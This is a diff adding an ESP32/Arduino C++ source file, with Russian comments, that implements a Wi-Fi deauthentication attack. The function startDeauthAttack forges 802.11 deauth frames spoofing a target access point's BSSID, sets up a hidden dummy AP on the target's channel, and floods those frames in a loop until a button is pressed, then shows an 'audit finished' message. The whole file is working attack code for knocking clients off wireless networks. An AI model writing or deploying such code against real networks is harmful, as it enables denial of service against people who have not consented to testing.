@@ -1,0 +1,91 @@
+#include "Attacks.h"
+#include "UI.h"
+#include "Arduino.h"
+#include "WiFi.h"
+#include "esp_wifi.h" // Для низкоуровневых функций Wi-Fi
+
+#define BOOT_BUTTON_PIN 0
+
+// 802.11 Deauthentication Frame Template
+const uint8_t deauth_frame_template[] = {
+    0xc0, 0x00, 0x3a, 0x01,
+    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination MAC: BROADCAST
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source MAC: Target AP BSSID (будет заменен)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID: Target AP BSSID (будет заменен)
+    0xf0, 0xff, 0x02, 0x00              // Reason code 2: Previous authentication no longer valid
+};
+
+void startDeauthAttack(const TargetInfo& ap) {
+    currentScreen = STATE_ATTACK_RUNNING;
+    menuNeedsRedraw = true;
+    drawScreen(); // Отображаем начальный экран атаки
+
+    uint8_t apBssidBytes[6];
+    sscanf(ap.bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
+           &apBssidBytes[0], &apBssidBytes[1], &apBssidBytes[2], &apBssidBytes[3], &apBssidBytes[4], &apBssidBytes[5]);
+
+    Serial.printf(">>> Starting Deauth Attack on AP %s (%s) on channel %d\n", ap.ssid.c_str(), ap.bssid.c_str(), ap.channel);
+    
+    // --- Низкоуровневая инициализация Wi-Fi в режиме AP для отправки пакетов ---
+    WiFi.disconnect(); 
+    esp_wifi_stop();
+
+    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+    esp_wifi_init(&cfg);
+    esp_wifi_set_storage(WIFI_STORAGE_RAM);
+    esp_wifi_set_mode(WIFI_MODE_AP);
+
+    // Создаем "фиктивную" точку доступа на нужном канале
+    wifi_config_t ap_config = {};
+    ap_config.ap.channel = (uint8_t)ap.channel;
+    ap_config.ap.ssid_hidden = 1;
+    ap_config.ap.max_connection = 0;
+    ap_config.ap.beacon_interval = 60000;
+
+    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+    esp_wifi_start();
+    esp_wifi_set_channel(ap.channel, WIFI_SECOND_CHAN_NONE);
+    
+    // --- Цикл атаки ---
+    uint8_t deauthFrame[sizeof(deauth_frame_template)];
+    memcpy(deauthFrame, deauth_frame_template, sizeof(deauth_frame_template));
+    memcpy(&deauthFrame[10], apBssidBytes, 6); // Устанавливаем MAC источника
+    memcpy(&deauthFrame[16], apBssidBytes, 6); // Устанавливаем BSSID
+
+    unsigned long packetCount = 0;
+    unsigned long lastUpdate = 0;
+
+    while (true) {
+        // Отправляем сырой пакет через интерфейс AP
+        esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
+        packetCount++;
+        
+        // Проверяем нажатие кнопки для выхода
+        if (digitalRead(BOOT_BUTTON_PIN) == LOW) {
+            break; 
+        }
+        
+        // Обновляем счетчик на экране раз в 250 мс
+        if (millis() - lastUpdate > 250) {
+            drawAttackScreen(ap, packetCount);
+            lastUpdate = millis();
+        }
+
+        delay(1); // Небольшая задержка для стабильности
+    }
+    
+    // --- Очистка и перезагрузка ---
+    Serial.println("Attack stopped by user. Rebooting device...");
+    
+    esp_wifi_stop();
+    esp_wifi_deinit();
+
+    // Показываем сообщение о перезагрузке
+    currentScreen = STATE_MESSAGE;
+    messageLine1 = (const char*)u8"Аудит завершен";
+    messageLine2 = (const char*)u8"Перезагрузка...";
+    drawScreen();
+
+    delay(2000);
+    ESP.restart();
+}
